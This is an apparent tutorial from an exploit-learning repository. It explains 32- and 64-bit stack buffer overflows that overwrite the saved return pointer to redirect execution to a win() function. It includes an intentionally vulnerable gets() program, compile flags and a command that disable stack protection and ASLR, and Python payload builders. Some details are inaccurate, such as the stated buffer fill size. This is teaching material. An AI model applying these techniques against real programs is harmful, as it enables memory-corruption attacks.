# EXPLOITS
## STACK BUFFER OVERFLOW : CONTROL FLOW REDIRECTION
## REQUIRED TO UNDERTSTAND : Simple stack buffer overflow  
### REDIRECT CODE EXECUTION

It's possible to redirect code execution with stack buffer overflows : It's done by overwriting the return pointer which is stored on the stack after the base pointer backup

Let's say we have this code :
```c
...
void vuln() //It has to be on another function, NOT MAIN() !!!
{
  char buffer[<BUFFER SIZE>]; //buffer to overflow
  ... // Code that can overflow the buffer ( exeaple : gets(buffer); )
}
int main()
{
  vuln(); //Main calls vuln() 
}
```
To compile this code use this GCC command to disable every protections :
```
gcc <source code file.c> -o <executable file> -fno-stack-protector -m32 -no-pie
# The -m32 flag is to compile on 32 bits, it's not required but just that it's a little bit more easier to exploit on 32 bits
```

If we disassemble the main function (for example with GDB), we see that it does a `call <vuln>`  
The call instruction will push on the top of the stack the address of the instruction which is just after the call, so in this case :
```asm
Dump of assembler code for function main:
   0x00401474 <+0>:     push   %ebp
   0x00401475 <+1>:     mov    %esp,%ebp
   0x00401477 <+3>:     and    $0xfffffff0,%esp
   0x0040147a <+6>:     call   0x4019c0 <__main>
   0x0040147f <+11>:    call   0x401460 <vuln> <--- The call
   0x00401484 <+16>:    mov    $0x0,%eax <--- The instruction just after the call
   0x00401489 <+21>:    leave
   0x0040148a <+22>:    ret
   0x0040148b <+23>:    nop
   0x0040148c <+24>:    xchg   %ax,%ax
   0x0040148e <+26>:    xchg   %ax,%ax
End of assembler dump.
```
So it will push `0x00401484` on the top of the stack  
Then it will simply jump to the address we supplied in the call, so here the address of `vuln`, we've pushed the address of the instruction after the call to jump to it after the called function ends, but we'll see that very quicly  

Now the stack looks like this :
```
0x00401484 <----- STACK POINTER
...
```
Now let's see what `vuln` does :
```asm
Dump of assembler code for function vuln:
   0x00401460 <+0>:     push   %ebp
   0x00401461 <+1>:     mov    %esp,%ebp
   0x00401463 <+3>:     sub    $0x58,%esp
   0x00401466 <+6>:     lea    -0x48(%ebp),%eax
   0x00401469 <+9>:     mov    %eax,(%esp)
   0x0040146c <+12>:    call   0x403a78 <gets>
   0x00401471 <+17>:    nop
   0x00401472 <+18>:    leave
   0x00401473 <+19>:    ret
End of assembler dump.
```
We see there is a `push ebp` at the beggining, so the address of `ebp` before the next instructions are executed is also pushed on the stack  
Let's say that `ebp` is `0x0061ff38`  

So here is the stack now :
```
0x0061ff38 (EBP BACKUP) <--- STACK POINTER
0x00401484 (RETURN POINTER : EIP after the call <vuln> in main backup)
...
```
In the function, there's also our buffer which is allocated :
```
BUFFER (64 bytes) <--- STACK POINTER
0x0061ff38 (EBP BACKUP) 
0x00401484 (RETURN POINTER : EIP after the call <vuln> in main backup)
...
```
Now at the end of the function, leave will increase the stack pointer by the size of each allocated variable, so here it's 64 because we only have a 64 bits buffer :
```
(Note that the buffer still exists here but is not part of the stack anymore, it's address is lower than the stack pointer)
0x0061ff38 (EBP BACKUP) <--- STACK POINTER
0x00401484 (RETURN POINTER : EIP after the call <vuln> in main backup)
...
```
The leave instruction will also `pop ebp` so it recovers the stack pointer and will increase `esp` by 4 so at the top of the stack we have the `EIP` backup :
```
0x00401484 <----- STACK POINTER
...
```
The `ret` instruction is called afterwards, as it does a `pop eip` it will set `eip` to the address at the top of the stack, so `0x00401484`, it also increases `esp` by 4 so this return pointer is not part of the stack anymore, so basically we recover our stack from before the call to `vuln`  

So now do you know what is the thing here ? Remember the stack looks like this before the `leave ; ret` :
```
BUFFER (64 bytes) <--- STACK POINTER
0x0061ff38 (EBP BACKUP) 
0x00401484 (RETURN POINTER : EIP after the call <vuln> in main backup)
...
```
It's simple, if we overflow the buffer we can overwrite the `ebp` backup and the `eip` backup, so for `ebp` the value we overwrite it with is not important but if we overwrite the `return pointer` with an address, it will at least try to jump to it, if it's a valid address it will jump to it otherwise we'll get a `SEGFAULT` (segmentation fault) error, so the program will crash  

So let's consider this code :
```c
#include <stdio.h>

void win() //Example address where to jump to
{
  printf("Yes, you won !\n");
}
void vuln() //It has to be on another function, NOT MAIN() !!!
{
  char buffer[64]; //buffer to overflow
  gets(buffer); // Can have a buffer overflow (even scanf("%s", buffer) works)
}
int main()
{
  vuln(); //Main calls vuln() 
}
```
To compile this code if the system is protected it should be :
```
gcc <source code file.c> -o <executable file> -fno-stack-protector -m32 -no-pie
# The -m32 flag is to compile on 32 bits, it's not required but just that it's a little bit more easier to exploit on 32 bits
# Make also sure that address space layout randomisation is disabled, run this as root :
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
So here the goal is to jump to `win()`, but we could jump to any address in the memory if it's executable  
The stack has to be like this :
```
[--------------------------------------------]
buffer (64 bytes) = <Any character> 256 times
EBP backup (4 bytes) = <Any character> 4 times
EIP backup (4 bytes) = <win> address (4 bytes)
[--------------------------------------------]
```
So our payload should be organised like this : 
```
|--(buffer (64 bytes))--|--(EBP (4 bytes))--|--(EIP (4 bytes))--   |
|Anything................|Anything...........|win() function address|
```
To find the `win()` function address we could use gdb :
```
gdb <target executable>
# IN GDB (gdb)>
x win
```
The output should look like :
```
0x....... <win>:	0x........
```
For this example, let's say that the `win()` address is `0x8049e15` so actually : `08 04 9e 15` in hexadecimal  
Now that we have all information and we now the `win()` function address, we can write the exploit, for this example i'm gonna use python because it's simple  
So we could imagine something like :
```python
# exploit.py file :
payload = 'A'*64 # To fill the buffer with 'A'
payload += 'B'*4 # EBP backup
payload += 'C'*4 # EIP backup
print(payload)
```
To send this to our program we could do :
```
python exploit.py > payload
```
Then to execute
```
./<executable> < payload
```
It should give a Segmentation fault  
Let's try in GDB, it should say that it can't find the address `0x 43 43 43 43` where to jump to
```
gdb <executable>
# IN GDB :
run < payload
```
So it should say `0x43434343 in ?? ()` or something else like some other characters for a certain reason, if it's not giving this address, you should adjust your payload, example, for me i had to use :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += 'C'*4 # EIP
file = open("payload", "w")
file.write(payload)
```
For me it gived in GDB :
```
0x43434343 in ?? ()
```
So it tried to jump to the `0x43434343` address which are our 'C's  
That's perfect, now i did control the EIP address !!
Okay, now to jump to the win function, we just have to set EIP backup (which is `0x43434343` for now) to the `win()` function address which is `08 04 9e 15` :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += "\x08\x04\x9e\x15" # EIP -> win() address : 0x 08 04 9e 15
file = open("payload", "w")
file.write(payload)
```
But, that's not going to work, actually, the address is wrote in the wrong way, the bytes should be reversed because that's how computer deals with addresses in memory, it's little endian :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += "\x15\x9e\x04\x08" # EIP -> win() address : 0x 08 04 9e 15 -> 0x 15 9e 04 08
file = open("payload", "w")
file.write(payload)
```
Or, we could also use a python module which is `struct` which is simpler to use for these things :
```python
import struct
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += struct.pack("I", 0x08049e15) # EIP (address not reversed in this case, it should be "Q" instead of "I" if it's on 64 bits)
file = open("payload", "wb")
file.write(payload)
file.close()
```
All seems good
Now :
```
python2 exploit.py
# Notice that i've used python version 2 for the struct module
./<executable> < payload
# You should get the "Yes, you won !" message
```
Thanks for have reading this !
### 64 bits : 
In 64 bits, EIP backup and EBP backup are 8 bytes
```python
import struct
payload = "A"*64 # Fill the buffer with 'A' (0x41) (we don't multiply the buffer size by 2)
payload += 'X'*4 # This could be 4 or 8 or 12, test them all 
payload += 'B'*8 # 4 * 2 EBP backup
payload += struct.pack("Q", <ADDRESS>)+"\x00"*2 # Here it's "Q" because it's 64 bits
file = open("payload", "wb")
file.write(payload)
file.close()
```
Note : For me the offset is 76 including the buffer, the werid value(s) and EBP backup
### Find the offset before overwriting EIP backup
To find he offset before overwriting EIP backup, we can use a simple pattern like alphabet or even more complex patterns, at the moment where we get a segfault, it means that we overwrote EIP backup, so let's do a simple pattern finder python exploit :
```python
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" # And so forth
print(payload)
```
Then :
```
python exploit.py | ./vuln
```
If we got a segmentation fault, it means that one of the values overwrote the EIP backup, so let's check in gdb :
```
python exploit.py > payload
gdb <executable>
# (GDB)>
run < payload
```
And then we get the message : `0xXXXXXXXX` in ?? (in 32 bits)
Then if **XX XX XX XX** are for example **54 54 54 54**, it means that we overwrote EIP backup with the character in our padding which has the asscii value XX (in hex) which is in this case 0x54 -> 'T' so the exact match for our offset is at index of our padding which is just before the first 'T' :
```python
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" # We removed all which is after the character that is just before the first 'T'
print("Exact match at index "+str(len(payload)))
```
Which prints in this case (buffer size : 64 bytes):
```
Exact match at index 76
```
So we know that just before overwriting EIP backup in this case, we have to enter 76 bytes  
In 64 bits, it's the same except that we double the length of each single character sequence :
```python
payload = "AAAAAAAABBBBBBBBCCCCCCCC..." # And so forth...
print(payload)
```
# Next Article
You should now take a look at shellcode injection, to execute arbitrary shellcode on the program : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Shellcode-injection.md
